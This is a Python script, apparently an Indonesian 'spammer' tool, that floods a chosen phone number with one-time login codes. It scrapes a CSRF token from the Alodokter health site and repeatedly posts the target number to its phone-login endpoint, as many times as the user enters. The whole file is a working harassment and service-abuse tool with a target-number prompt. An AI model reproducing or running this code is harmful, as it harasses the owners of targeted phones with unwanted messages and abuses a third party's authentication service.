import os,json,shutil,requests,re,sys,time
from bs4 import BeautifulSoup as sup
from fake_useragent import UserAgent

if sys.platform in ['win32','nt']:
	W = ''
	R = ''
	G = ''
	Y = ''
	B = ''
	L = ''
	C = ''
	_W = ''
	_R = ''
	_G = ''
	_Y = ''
	_B = ''
	_L = ''
	_C = ''
else:
	W = '\033[0m'
	R = '\033[91m'
	G = '\033[92m'
	Y = '\033[93m'
	B = '\033[94m'
	L = '\033[95m'
	C = '\033[96m'
	_W = '\033[1;97m'
	_R = '\033[1;91m'
	_G = '\033[1;92m'
	_Y = '\033[1;93m'
	_B = '\033[1;94m'
	_L = '\033[1;95m'
	_C = '\033[1;96m'
try:
	os.mkdir('__pycache__')
except:
	pass
try:
	shutil.rmtree('__pycache__')
except:
	pass
def Sukses(nomor,u):
	print (f'{W}[{G}{u}{W}] Sukses Terkirim Ke {C}{nomor}{W}')

class Spammer:
	def __init__(self):
		self.c = requests.Session()
	def alodok(self,nomor,jumlah):
		for i in range(1,int(jumlah)+1):
			r = requests.get('https://www.alodokter.com/login-alodokter')
			parser = sup(r.text,features='html.parser')
			token = parser.find('meta',{'name':'csrf-token'})['content']
			head = {'accept':'application/json','x-csrf-token':token,'user-agent':'Mozilla/5.0 (Linux; Android 9; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36','content-type':'application/json','origin':'https://www.alodokter.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://www.alodokter.com/login-alodokter','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			req = requests.post('https://www.alodokter.com/login-with-phone-number',headers=head,json=
			{'user':{'phone':nomor}}).json()
			#print (req.text)
			if 'success' in req['status']:
				Sukses(nomor,i)
				time.sleep(1)
def update():
	r = requests.get('http://auxcrewtbdrpg.com/update.txt')
	if '1.3' in str(r.text):
		return r.text.replace('\\033','\033').replace('\\n','\n')
	else:
		return ''
while True:
	os.system('clear')
	try:
		print (f'''

{R} █████╗ ██╗      ██████╗ ██████╗  ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
{R}██╔══██╗██║     ██╔═══██╗██╔══██╗██╔═══██╗██║ ██╔╝╚══██╔══╝██╔════╝██╔══██╗
{R}███████║██║     ██║   ██║██║  ██║██║   ██║█████╔╝    ██║   █████╗  ██████╔╝
{W}██╔══██║██║     ██║   ██║██║  ██║██║   ██║██╔═██╗    ██║   ██╔══╝  ██╔══██╗
{W}██║  ██║███████╗╚██████╔╝██████╔╝╚██████╔╝██║  ██╗   ██║   ███████╗██║  ██║
{W}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

                    {R}01.{G} Run
                    {Y}00.{G} Exit
''')
		pil = input(f'{W}[{B}Pilih{W}] : ')
		if pil == '1' or pil == '01':
			nomor = input(f'{W} Nomor Target : ')
			if nomor == '':
				exit(f'{G}[!]{R} Di isi dulu Gan!')
			jumlah = input(f'{R}[+]{G} Jumlah spam : ')
			if jumlah == '':
				exit(f'{G}[!]{R} Di isi dulu Gan!!')
			print()
			Spammer().alodok(nomor,jumlah)
		elif pil == '0' or pil == '00':
                        exit("Exit")
		else:
			print(f'{R}[!]{G} Pilihan Tidak Ada! ')
		tanya = input('\n[?] {Y}Coba Lagi (y/n) : ')
		if tanya.lower() == 'n':
		        exit()
	except KeyboardInterrupt:
			exit()
	except Exception as J:
		exit(J)
